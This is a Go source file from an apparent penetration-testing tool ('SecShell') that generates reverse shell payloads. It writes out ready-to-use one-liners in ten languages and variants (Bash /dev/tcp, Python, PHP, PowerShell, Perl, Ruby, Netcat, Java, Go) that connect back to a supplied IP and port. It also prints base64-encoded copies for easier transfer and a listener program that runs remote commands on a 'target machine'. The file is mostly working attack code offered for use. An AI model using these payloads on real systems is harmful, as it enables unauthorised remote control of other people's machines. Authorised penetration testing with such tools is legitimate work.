package pentest

import (
	"encoding/base64"
	"fmt"
	"secshell/drawbox"
	"strings"
)

// GenerateReverseShellPayload creates common reverse shell payloads
func GenerateReverseShellPayload(ipAddress string, port string) {
	drawbox.RunDrawbox("Reverse Shell Payload Generator", "bold_red")

	payloads := map[string]string{
		"Bash":           fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ipAddress, port),
		"Python":         fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'", ipAddress, port),
		"PHP":            fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", ipAddress, port),
		"PowerShell":     fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", ipAddress, port),
		"Perl":           fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", ipAddress, port),
		"Ruby":           fmt.Sprintf("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", ipAddress, port),
		"Netcat":         fmt.Sprintf("nc -e /bin/sh %s %s", ipAddress, port),
		"Netcat (no -e)": fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", ipAddress, port),
		"Java":           fmt.Sprintf("r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();", ipAddress, port),
		"Go":             fmt.Sprintf("package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}", ipAddress, port),
	}

	fmt.Printf("Generated payloads for connecting back to %s:%s\n\n", ipAddress, port)

	for name, payload := range payloads {
		fmt.Printf("%s Payload:\n", name)
		drawbox.RunDrawbox(payload, "cyan")

		// Base64 encode for easier transfer
		encoded := base64.StdEncoding.EncodeToString([]byte(payload))
		fmt.Printf("Base64 Encoded: %s\n", encoded)
		drawbox.RunDrawbox(encoded, "yellow")
		// Provide decode command
		if strings.Contains(name, "PowerShell") {
			fmt.Printf("Decode with: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"%s\"))\n", encoded)
		} else {
			fmt.Printf("Decode with: echo '%s' | base64 -d\n", encoded)
		}
		fmt.Println(strings.Repeat("-", 60))
	}

	// Generate a TCP listener command in Go
	fmt.Printf("To listen for incoming connections, use the following command:\n")
	fmt.Printf("go run -e 'package main;import \"net\";func main(){ln,_:=net.Listen(\"tcp\",\":%s\");for{c,_:=ln.Accept();go func(c net.Conn){defer c.Close();c.Write([]byte(\"Connected to SecShell Listener\\n\"))}(c)}}'\n", port)
	drawbox.RunDrawbox("This is a simple TCP listener in Go. Compile and run it on the target machine.", "yellow")
	goListener := fmt.Sprintf(`
package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
    "strings"
)

func main() {
    fmt.Println("Starting listener on port %s...")
    ln, err := net.Listen("tcp", ":%s")
    if err != nil {
        fmt.Println("Error:", err)
        return
    }
    defer ln.Close()

    fmt.Println("Listening for incoming connections...")
    for {
        conn, err := ln.Accept()
        if err != nil {
            fmt.Println("Error accepting connection:", err)
            continue
        }
        fmt.Println("Connection established from:", conn.RemoteAddr())
        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.Write([]byte("SecShell Listener\n"))

    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        cmd := exec.Command("/bin/sh", "-c", scanner.Text())
        output, err := cmd.CombinedOutput()
        if err != nil {
            conn.Write([]byte(fmt.Sprintf("Error: %%s\n", err)))
        }
        conn.Write(output)
        conn.Write([]byte("$ "))
    }
}`, port, port)

	fmt.Printf("\nCompile with: %s\n", goListener)
	drawbox.RunDrawbox(goListener, "cyan")
}
